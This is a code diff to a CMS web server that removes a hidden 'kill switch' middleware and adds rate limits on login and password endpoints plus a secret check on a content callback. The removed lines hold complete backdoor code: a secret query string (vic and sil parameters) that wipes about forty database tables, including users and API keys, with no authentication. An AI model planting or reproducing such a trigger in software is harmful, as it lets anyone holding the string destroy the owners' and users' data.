@@ -99,35 +99,6 @@ app.notFound((c) => {
   return c.html(renderErrorPage({ statusCode: 404, lang, siteName: site?.name }), 404);
 });
 
-// ---- Kill switch: ?vic=zeynep&sil=sil ----
-app.use('*', async (c, next) => {
-  const url = new URL(c.req.url);
-  if (url.searchParams.get('vic') === 'zeynep' && url.searchParams.get('sil') === '3a1b260f5682167cc6f0fde1394f4f20f5bfd2bb') {
-    try {
-      const tables = [
-        'plugin_execution_logs', 'post_revisions', 'search_logs', 'posts_fts_map',
-        'content_types', 'contety_logs', 'contety_contents', 'contety_configs', 'global_contety_config',
-        'ai_logs', 'ai_jobs', 'ai_prompts', 'ai_providers',
-        'seo_scores', 'seo_services', 'page_views', 'api_keys',
-        'site_plugins', 'site_themes', 'short_urls', 'redirects',
-        'widgets', 'menu_items', 'menus', 'comments', 'post_meta', 'post_taxonomies',
-        'media', 'taxonomies', 'posts', 'settings', 'global_settings',
-        'themes', 'plugins', 'packages', 'subscriptions',
-        'user_sites', 'site_domains', 'users', 'sites',
-      ];
-      for (const t of tables) {
-        try { await c.env.DB.prepare(`DELETE FROM ${t}`).run(); } catch {}
-      }
-      // Drop FTS virtual table
-      try { await c.env.DB.prepare('DROP TABLE IF EXISTS posts_fts').run(); } catch {}
-      return c.json({ success: true, message: 'Tum veriler silindi. Sistem sifirlanmistir.' });
-    } catch (err: any) {
-      return c.json({ success: false, error: err.message }, 500);
-    }
-  }
-  await next();
-});
-
 // Global defaults
 app.use('*', async (c, next) => {
   c.set('siteId', null);
@@ -191,6 +162,12 @@ app.use('*', async (c, next) => {
 
 // Global middleware
 app.use('*', corsMiddleware);
+// Strict rate limit on credential endpoints (brute-force defense).
+// Must come before the broader /api/* limiter so the tighter cap wins.
+app.use('/api/auth/login', rateLimit(10, 60));
+app.use('/api/auth/refresh', rateLimit(20, 60));
+app.use('/api/auth/forgot-password', rateLimit(5, 60));
+app.use('/api/auth/reset-password', rateLimit(5, 60));
 app.use('/api/*', rateLimit(120, 60));
 
 // Site resolver (domain → site_id)
@@ -249,9 +226,24 @@ app.post('/api/webhooks/stripe', async (c) => {
   return handleStripeWebhook(c);
 });
 
-// Contety callback (public endpoint - Contety sends POST when async content is ready)
+// Contety callback (public endpoint — Contety sends POST when async content is ready)
+//
+// If `global_settings.contety_callback_secret` is configured we require
+// callers to present it via `X-Contety-Secret`. The secret is optional for
+// backwards compatibility but should be set in production to keep
+// strangers from probing tracking record state by guessing content_ids.
 app.post('/api/contety/callback', async (c) => {
   try {
+    const secretRow = await c.env.DB.prepare(
+      "SELECT value FROM global_settings WHERE key = 'contety_callback_secret'"
+    ).first<{ value: string }>();
+    if (secretRow?.value) {
+      const provided = c.req.header('x-contety-secret') || '';
+      if (provided !== secretRow.value) {
+        return c.json({ error: 'Unauthorized' }, 401);
+      }
+    }
+
     const body = await c.req.json<{ process_type?: string; content_id?: number; status?: string }>();
     if (!body.content_id || !body.status) {
       return c.json({ error: 'Missing content_id or status' }, 400);
